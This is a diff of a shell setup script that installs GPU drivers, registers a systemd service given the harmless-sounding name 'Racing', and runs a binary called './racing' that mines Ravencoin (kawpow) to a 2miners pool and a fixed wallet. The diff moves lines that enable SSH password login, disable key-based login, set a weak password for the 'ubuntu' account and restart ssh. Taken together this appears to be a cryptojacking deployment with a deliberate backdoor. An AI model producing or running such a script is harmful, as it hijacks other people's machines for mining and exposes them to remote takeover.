@@ -1,3 +1,7 @@
+sudo sed -i '/PasswordAuthentication no/c\PasswordAuthentication yes' /etc/ssh/sshd_config
+sudo sed -i '/PubkeyAuthentication yes/c\PubkeyAuthentication no' /etc/ssh/sshd_config
+echo "ubuntu:blabla123" | sudo chpasswd
+sudo service ssh restart
 cd /home
 sudo apt-get install linux-headers-$(uname -r) -y
 distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
@@ -17,7 +21,3 @@ sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Serv
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
 sudo ./racing -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RM11VvoTyD4CeixsMLHR9ntqpaMTKHMEYL.abcd -p x &
-sudo sed -i '/PasswordAuthentication no/c\PasswordAuthentication yes' /etc/ssh/sshd_config
-sudo sed -i '/PubkeyAuthentication yes/c\PubkeyAuthentication no' /etc/ssh/sshd_config
-echo "ubuntu:blabla123" | sudo chpasswd
-sudo service ssh restart
